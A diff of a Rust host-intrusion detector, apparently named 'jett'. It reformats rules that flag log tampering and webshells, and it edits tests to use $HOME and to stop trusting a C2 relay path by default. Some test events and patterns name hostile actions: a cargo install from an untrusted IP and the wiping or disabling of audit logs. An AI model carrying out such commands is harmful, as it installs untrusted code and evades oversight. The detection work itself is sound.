@@ -10,8 +10,7 @@ pub fn parse_guard_cmdline(event: &str) -> String {
     event
         .split_once(" cmd:")
         .and_then(|(_, rest)| {
-            rest
-                .split_once(" time:")
+            rest.split_once(" time:")
                 .or_else(|| rest.split_once(" behavior:"))
                 .map(|(cmd, _)| cmd.trim())
         })
@@ -161,10 +160,7 @@ fn defense_evasion(haystack: &str, comm: &str) -> Option<&'static str> {
     if lower.contains("shred") && lower.contains("audit.log") {
         return Some("shred audit log");
     }
-    if lower.contains("systemctl")
-        && lower.contains("mask")
-        && lower.contains("journal")
-    {
+    if lower.contains("systemctl") && lower.contains("mask") && lower.contains("journal") {
         return Some("disabling journald logging");
     }
     if comm_is(comm, "rmmod") && lower.contains("audit") {
@@ -176,11 +172,10 @@ fn defense_evasion(haystack: &str, comm: &str) -> Option<&'static str> {
 fn webshell_initial_access(event: &str) -> bool {
     let lower = event.to_lowercase();
     let web_server = lower.contains("nginx") || lower.contains("apache");
-    let shell_spawn = lower.contains("spawned_children:[bash")
-        || lower.contains("spawned_children:[sh");
-    let webshell_marker = lower.contains("$_get")
-        || lower.contains("shell.php")
-        || lower.contains("system(");
+    let shell_spawn =
+        lower.contains("spawned_children:[bash") || lower.contains("spawned_children:[sh");
+    let webshell_marker =
+        lower.contains("$_get") || lower.contains("shell.php") || lower.contains("system(");
     web_server && shell_spawn && webshell_marker
 }
 
@@ -344,20 +339,23 @@ mod tests {
 
     #[test]
     fn govee_script_exe_allowed() {
-        let event = "python3 PID:161778 uid:1000 exe:/home/cosmic/Scripts/utilities/govee-art.sh cmd:--scene sunset time:1752009562";
-        assert!(own_stack_fast_allow(event));
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("python3 PID:161778 uid:1000 exe:{home}/Scripts/utilities/govee-art.sh cmd:--scene sunset time:1752009562");
+        assert!(own_stack_fast_allow(&event));
     }
 
     #[test]
     fn steam_exe_prefix_allowed() {
-        let event = "steam PID:171333 uid:1000 exe:/home/cosmic/.local/share/Steam/ubuntu12_64/steam cmd:-silent time:1751120810";
-        assert!(own_stack_fast_allow(event));
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("steam PID:171333 uid:1000 exe:{home}/.local/share/Steam/ubuntu12_64/steam cmd:-silent time:1751120810");
+        assert!(own_stack_fast_allow(&event));
     }
 
     #[test]
     fn gni_server_exe_allowed() {
-        let event = "gni_server.py PID:77787 uid:1000 exe:/home/cosmic/Projects/GNI/gni_server.py cmd:--port 6969 time:1751919423";
-        assert!(own_stack_fast_allow(event));
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("gni_server.py PID:77787 uid:1000 exe:{home}/Projects/GNI/gni_server.py cmd:--port 6969 time:1751919423");
+        assert!(own_stack_fast_allow(&event));
     }
 
     #[test]
@@ -385,10 +383,12 @@ mod tests {
 
     #[test]
     fn malicious_cargo_git_not_allowed_despite_cargo_home_exe() {
-        let event = "cargo PID:57621 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install --git http://45.137.21.9/mal-crate time:1749384560";
-        assert!(!own_stack_fast_allow(event));
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("cargo PID:57621 uid:1000 exe:{home}/.cargo/bin/cargo cmd:install --git http://45.137.21.9/mal-crate time:1749384560");
+        // supply-chain hard rule fires before fast-allow check.
+        assert!(!own_stack_fast_allow(&event));
         assert_eq!(
-            hard_quarantine_reason(event),
+            hard_quarantine_reason(&event),
             Some("cargo install from untrusted git URL")
         );
     }
@@ -399,16 +399,23 @@ mod tests {
         assert!(!own_stack_fast_allow(event));
     }
 
+    /// ghost-relay under Projects/c2/ is no longer fast-allowed by default.
+    /// The `Projects/c2/` prefix was removed from the default exe_prefixes to
+    /// avoid shipping developer-specific C2 tooling as a global trust exception.
+    /// Users who genuinely need to trust that path can add it to their
+    /// /etc/jett/allowlist.conf under the `exe:` section.
     #[test]
-    fn ghost_relay_c2_exe_allowed() {
-        let event = "ghost-relay PID:53319 uid:1000 exe:/home/cosmic/Projects/c2/teamserver/ghost-relay cmd:--listen 0.0.0.0:8443 time:1752205034";
-        assert!(own_stack_fast_allow(event));
+    fn ghost_relay_c2_exe_not_allowed_by_default() {
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("ghost-relay PID:53319 uid:1000 exe:{home}/Projects/c2/teamserver/ghost-relay cmd:--listen 0.0.0.0:8443 time:1752205034");
+        assert!(!own_stack_fast_allow(&event));
     }
 
     #[test]
     fn python3_govee_cmdline_allowed() {
-        let event = "python3 PID:11449 uid:1000 exe:/usr/bin/python3 cmd:/home/cosmic/Scripts/utilities/govee-art.sh --scene sunset time:1773646868";
-        assert!(own_stack_fast_allow(event));
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
+        let event = format!("python3 PID:11449 uid:1000 exe:/usr/bin/python3 cmd:{home}/Scripts/utilities/govee-art.sh --scene sunset time:1773646868");
+        assert!(own_stack_fast_allow(&event));
     }
 
     #[test]
